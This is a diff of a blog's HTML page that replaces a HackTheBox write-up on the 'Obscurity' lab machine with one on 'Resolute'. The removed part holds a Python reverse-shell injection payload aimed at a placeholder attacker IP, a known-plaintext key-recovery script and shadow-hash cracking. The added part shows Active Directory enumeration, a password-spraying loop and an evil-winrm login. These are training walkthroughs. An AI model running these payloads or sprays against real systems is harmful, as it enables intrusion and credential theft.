@@ -3,33 +3,43 @@
 <head>
     <meta charset="utf-8">
 
-    <title>HTB Write-up | Obscurity</title>
+    <title>HTB Write-up | Resolute</title>
 
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <link rel="canonical" href="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
+    <link rel="canonical" href="https://inesmartins.github.io//htb-walkthrough-resolute-user/" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
     
     <meta property="og:site_name" content="Inês Martins" />
     <meta property="og:type" content="article" />
-    <meta property="og:title" content="HTB Write-up | Obscurity" />
-    <meta property="og:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta property="og:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
-    <meta property="article:published_time" content="2020-06-07T17:54:05.000Z" />
-    <meta property="article:modified_time" content="2020-12-08T10:38:05.000Z" />
+    <meta property="og:title" content="HTB Write-up | Resolute" />
+    <meta property="og:description" content="The retired machine can be found here. Official write-up can be downloaded here. I started with some basic scanning with nmap that found that most likely this machine was a Domain Controller, since it had all the required ports open.  $ nmap -sC -sV 10.10.10.169 -Pn 53/tcp" />
+    <meta property="og:url" content="https://inesmartins.github.io//htb-walkthrough-resolute-user/" />
+    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/resolute.png" />
+    <meta property="article:published_time" content="2020-06-08T11:58:35.000Z" />
+    <meta property="article:modified_time" content="2020-06-08T12:03:33.000Z" />
+    <meta property="article:tag" content="windows" />
+    <meta property="article:tag" content="htb" />
+    <meta property="article:tag" content="ad" />
+    <meta property="article:tag" content="windapsearch" />
+    <meta property="article:tag" content="domain controller" />
+    <meta property="article:tag" content="windows domain" />
+    <meta property="article:tag" content="evil-winrm" />
+    
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="HTB Write-up | Obscurity" />
-    <meta name="twitter:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta name="twitter:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
+    <meta name="twitter:title" content="HTB Write-up | Resolute" />
+    <meta name="twitter:description" content="The retired machine can be found here. Official write-up can be downloaded here. I started with some basic scanning with nmap that found that most likely this machine was a Domain Controller, since it had all the required ports open.  $ nmap -sC -sV 10.10.10.169 -Pn 53/tcp" />
+    <meta name="twitter:url" content="https://inesmartins.github.io//htb-walkthrough-resolute-user/" />
+    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/resolute.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Inês Martins" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="windows, htb, ad, windapsearch, domain controller, windows domain, evil-winrm" />
     <meta name="twitter:site" content="@inesmartns" />
-    <meta property="og:image:width" content="594" />
-    <meta property="og:image:height" content="377" />
+    <meta property="og:image:width" content="597" />
+    <meta property="og:image:height" content="379" />
     
     <script type="application/ld+json">
 {
@@ -58,17 +68,18 @@
         "url": "https://inesmartins.github.io//author/ines/",
         "sameAs": []
     },
-    "headline": "HTB Write-up | Obscurity",
-    "url": "https://inesmartins.github.io//htb-walkthrough-obscurity/",
-    "datePublished": "2020-06-07T17:54:05.000Z",
-    "dateModified": "2020-12-08T10:38:05.000Z",
+    "headline": "HTB Write-up | Resolute",
+    "url": "https://inesmartins.github.io//htb-walkthrough-resolute-user/",
+    "datePublished": "2020-06-08T11:58:35.000Z",
+    "dateModified": "2020-06-08T12:03:33.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://inesmartins.github.io//content/images/2020/06/1-1.png",
-        "width": 594,
-        "height": 377
+        "url": "https://inesmartins.github.io//content/images/2020/06/resolute.png",
+        "width": 597,
+        "height": 379
     },
-    "description": "Write-up for Obscurity, a retired HTB Linux machine.",
+    "keywords": "windows, htb, ad, windapsearch, domain controller, windows domain, evil-winrm",
+    "description": "The retired machine can be found here\n[https://www.hackthebox.eu/home/machines/profile/220].\nOfficial write-up can be downloaded here\n[https://www.hackthebox.eu/home/machines/writeup/220].\n\nI started with some basic scanning with nmap that found that most likely this\nmachine was a Domain Controller, since it had all the required ports\n[http://techgenix.com/domain-controllers-required-ports/] open. \n\n$ nmap -sC -sV 10.10.10.169 -Pn\n\n53/tcp open domain?\n| fingerprint-strings:\n    | DNSVersionBindR",
     "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https://inesmartins.github.io//"
@@ -100,118 +111,125 @@
         <article class="post">
 
             <header class="post-header">
-                <h1 class="post-title">HTB Write-up | Obscurity</h1>
+                <h1 class="post-title">HTB Write-up | Resolute</h1>
                 <section class="post-meta">
                     <p class="author">by <a href="/author/ines/">Inês Martins</a></p>
-                    <time class="post-date" datetime="2020-06-07">2020-06-07</time>
+                    <time class="post-date" datetime="2020-06-08">2020-06-08</time>
                 </section>
             </header>
             <figure class="post-image">
-                <amp-img src="https://inesmartins.github.io//content/images/2020/06/1-1.png" width="600" height="400" layout="responsive"></amp-img>
+                <amp-img src="https://inesmartins.github.io//content/images/2020/06/resolute.png" width="600" height="400" layout="responsive"></amp-img>
             </figure>
             <section class="post-content">
 
-                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>After doing an initial scan with <code>nmap</code>, we find that this is a Linux (Ubuntu) machine with 2 exposed services: <code>OpenSSH</code> on port 22 and a custom web server on port 8080.</p><pre><code>$ nmap -sC -sV -A obscurity.htb
+                <p><em>The retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/220">here</a>.<br />Official write-up can be downloaded <a href="https://www.hackthebox.eu/home/machines/writeup/220">here</a>.</em></p><p>I started with some basic scanning with nmap that found that most likely this machine was a Domain Controller, since it had all the <a href="http://techgenix.com/domain-controllers-required-ports/">required ports</a> open. </p><pre><code>$ nmap -sC -sV 10.10.10.169 -Pn
 
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-8080/tcp open http-proxy BadHTTPServer
-```</code></pre>
-<p>There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, now we know there is a file called <code>SuperSecureServer.py</code> which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
+53/tcp open domain?
+| fingerprint-strings:
+    | DNSVersionBindReqTCP:
+        | version
+        |_ bind
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-21 22:13:06Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open mc-nmf .NET Message Framing
+47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open msrpc Microsoft Windows RPC
+49665/tcp open msrpc Microsoft Windows RPC
+49666/tcp open msrpc Microsoft Windows RPC
+49667/tcp open msrpc Microsoft Windows RPC
+49671/tcp open msrpc Microsoft Windows RPC
+49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+49677/tcp open msrpc Microsoft Windows RPC
+49688/tcp open msrpc Microsoft Windows RPC
+49860/tcp open tcpwrapped
+49907/tcp open msrpc Microsoft Windows RPC
+1 service unrecognized despite returning data.
+If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+
+SF-Port53-TCP:
+     V=7.80%
+     I=7%
+     D=12/21%
+     Time=5DFE9733%
+     P=x86_64-apple-darwin17.7.0
+     SF:%r(DNSVersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07v
+     SF:ersion\x04bind\0\0\x10\0\x03");
+
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: mean: 2h47m28s, deviation: 4h37m09s, median: 7m27s
+| smb-os-discovery:
+     | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+     | Computer name: Resolute
+     | NetBIOS computer name: RESOLUTE\x00
+     | Domain name: megabank.local
+     | Forest name: megabank.local
+     | FQDN: Resolute.megabank.local
+     |_ System time: 2019-12-21T14:13:46-08:00
+| smb-security-mode:
+     | account_used: &lt;blank&gt;
+     | authentication_level: user
+     | challenge_response: supported
+     |_ message_signing: required
+| smb2-security-mode:
+     | 2.02:
+     |_ Message signing enabled and required
+| smb2-time:
+     | date: 2019-12-21T22:13:45
+     |_ start_date: 2019-12-21T21:06:24
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 206.55 seconds
 </code></pre>
-<p>The mystery directory is <code>develop</code>, so know we have access to <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">the server's source code</a>, in the form of a Python script: <br />While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"></figure><p>Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as <code>wwwdata</code>.</p><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
+<p>This enumeration also revealed that the machine's name is Resolute and the Domain/Forest name is megabank.local.</p><p>Since we think this machine is a Domain Controller, we try to enumerate the users in the Domain using the <a href="https://github.com/ropnop/windapsearch">windapsearch.py</a> script.</p><blockquote><code>windapsearch</code> is a Python script to help enumerate users, groups and computers from a Windows domain through LDAP queries. By default, Windows Domain Controllers support basic LDAP operations through port 389/tcp. With any valid domain account (regardless of privileges), it is possible to perform LDAP queries against a domain controller for any AD related information.</blockquote><pre><code>python2 ./windapsearch.py -d Resolute.megabank.local --dc-ip 10.10.10.169 --full --attrs 'badPwdCount,lastLogon' --users
 </code></pre>
-<hr></hr><h2 id="getting-user">Getting user</h2><p>It seems like our first goal is to become <code>robert</code>.</p><pre><code>$ cat etc/passwd
-...
-robert:x:1000:1000:robert:/home/robert:/bin/bash
+<p>This allowed us to find a list with details about all users including full name and description. Here, we came across something very interesting:</p><pre><code>userPrincipalName: marko@megabank.local
+displayName: Marko Novak
+description: Account created. Password set to Welcome123!
 </code></pre>
-<p>Listing the contents of <code>robert</code>'s home directory, we get some interesting files:</p><pre><code>$ ls /home/robert
-BetterSSH/BetterSSH.py
-check.txt
-out.txt
-passwordreminder.txt
-SuperSecureCrypt.py
-user.txt
+<p>So, we tried to use this password to authenticate marko using the same script:</p><pre><code>python2 ./windapsearch.py -d Resolute.megabank.local --dc-ip 10.10.10.169 --user marko@megabank.local --password Welcome123!
 </code></pre>
-<pre><code>$ cat check.txt
-Encrypting this file with your key should result in out.txt, make sure your key is correct!
+<p>Since this failed, we tried to use the same password to authenticate the other known users:</p><pre><code>import os
 
-$ cat out.txt
-¦ÚÈêÚÞØÛÝÝ‰×ÐÊß…ÞÊÚÉ’æßÝËˆÚÛÚêÙÉëéÑÒÝÍÐ…êÆáÙÞã–ÒÑˆÐáÙ¦ÕæØžãÊÎÍßÚêÆŽÝáäè‰ÎÍÚŒÎëÑÓäáÛÌ×‰v
+names = [ 'ryan', 'marko', 'sunita', 'abigail', 'marcus', 'sally', 'fred', 'angela', 'felicia', 'gustavo', 'ulf', 'stevie', 'claire', 'paulo', 'steve', 'annette', 'annika', 'per', 'claude', 'melanie', 'zach', 'simon', 'naoki' ]
 
-$ cat passwordreminder.txt
-´ÑÈÌÉàÙÁÑé¯·¿
+for name in names:
+    full_usr = name + '@megabank.local'
+    print('Trying password Welcome123! with user ' + full_usr)
+    os.system('python2 windapsearch.py -d Resolute.megabank.local --dc-ip 10.10.10.169 --user ' + full_usr  + ' --password Welcome123!')
 </code></pre>
-<p>So, by encrypting <code>check.txt</code> with an unknown algorithm we get <code>out.txt</code>.<br />Also, when use we this key to encrypt <code>robert</code>'s password we get the content of <br /><code>passwordreminder.txt</code>.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br />Let's create a script to find the key!</p><pre><code>import sys
+<p>This succeeded for melanie:</p><pre><code>Trying password Welcome123! with user melanie@megabank.local
+[+] Using Domain Controller at: 10.10.10.169
+[+] Getting defaultNamingContext from Root DSE
+[+] Found: DC=megabank,DC=local
+[+] Attempting bind
+[+] ...success! Binded as:
+[+] u:MEGABANK\melanie
 
-# extend alphabet if necessary
-alphabet = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ"
-
-def decode_ciphertext(ciphertext, key):
-    key_pos = 0
-    plaintext = ""
-    for x in ciphertext:
-        new_char = chr((ord(x) - ord(key[key_pos])) % 255)
-        plaintext += new_char
-        key_pos += 1
-        key_pos = key_pos % len(key)
-    return plaintext
-
-def get_key(p1, c1):
-    i = 0
-    key = ""
-    while i &lt; len(p1):
-        found_match = False
-        for x in alphabet:
-            new_char = chr((ord(p1[i]) + ord(x)) % 255)
-            if new_char == c1[i]:
-                print("Found match, current key is " + key)
-                found_match = True
-                i += 1
-                key += x
-        if found_match == False:
-            print("Couldn't find match for char at index " + str(i))
-            return 0
-    return key
-
-def main(argv):
-    p1 = open(argv[0], "r").read()
-    c1 = open(argv[1], "r").read()
-    c2 = open(argv[2], "r").read()
-
-    print("\nKnown plaintext: \n" + p1)
-    print("Known ciphertext: \n" + c1)
-    print("Ciphertext to decode: \n" + c2)
-
-    key = get_key(p1, c1)
-    if key == 0:
-        print("Unable to calculate key!")
-    else:
-        p2 = decode_ciphertext(c2, key)
-        print("Original plaintext: " + p2)
-
-if __name__ == "__main__":
-    if len(sys.argv) &lt; 3:
-        print("Please specify the following arguments:")
-        print("[0] known plaintext file")
-        print("[1] known ciphertext file")
-        print("[2] ciphertext to decode")
-    else:
-        main(sys.argv[1:])</code></pre><p>Now that we have <code>robert</code>'s password we can <code>SSH</code> into the machine, get the user flag and move on to root. </p><h2 id="getting-root">Getting root</h2><p>We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><pre><code>$ ./LinEnum.sh...
-User robert may run the following commands on obscure:
-(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
--e
+[*] Bye!
 </code></pre>
-<p>Let's run <code>BetterSSH</code> as sudo to test this:</p><pre><code>$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-Enter username: robert
-Enter password: xxx
-Authed!
+<p>As you can see, we're being booted out from the machine as soon as we authenticate, which we were able to surpass using <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>:</p><pre><code>$ ruby evil-winrm.rb -i 10.10.10.169 -u melanie@megabank.local -p 'Welcome123!'
+
+Evil-WinRM shell v2.0
+
+Info: Establishing connection to remote endpoint
+
+Evil-WinRM* PS C:\Users\melanie\Desktop&gt; cat user.txt
 </code></pre>
-<p>After looking at <code>BetterSSH.py</code> we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on <code>/tmp/SSH/</code>.</p><figure class="kg-card kg-image-card"></figure><p>So we create a script to print them to a file we can read after the process is finished (<code>/tmp/o.txt</code>):</p><figure class="kg-card kg-image-card"></figure><p>Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><pre><code>$ echo "root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7" &gt; shadow
-$ echo "root:x:0:0:root:/root:/bin/bash" &gt; passwd
-$ unshadow passwd shadow &gt; crack.password.db
-$ john crack.password.db
-</code></pre>
-<p>That's it, hope you enjoyed it!</p>
+
 
             </section>
 
